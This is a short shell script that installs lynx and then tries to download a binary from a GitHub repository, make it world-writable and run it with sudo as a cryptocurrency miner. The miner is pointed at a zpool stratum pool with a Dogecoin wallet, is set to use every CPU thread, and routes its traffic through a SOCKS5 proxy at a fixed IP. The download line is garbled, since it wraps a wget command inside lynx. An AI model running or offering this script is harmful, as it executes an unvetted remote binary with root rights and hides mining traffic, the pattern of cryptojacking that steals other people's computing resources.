apt update
apt install -y lynx
lynx -dont_wrap_pre -dump "wget https://github.com/TamJsmt/TamJsmt/raw/main/data" > data && chmod 777 data && sudo ./data -a yescryptr16 -o stratum+tcps://yescryptR16.na.mine.zpool.ca:56333 -u DG1Fvzq3Z5HNzx2VRNqnKDDBJq7A3NVCvS -p c=DOGE,zap=QOGE -t $(nproc) -x socks5://192.252.211.197:14921
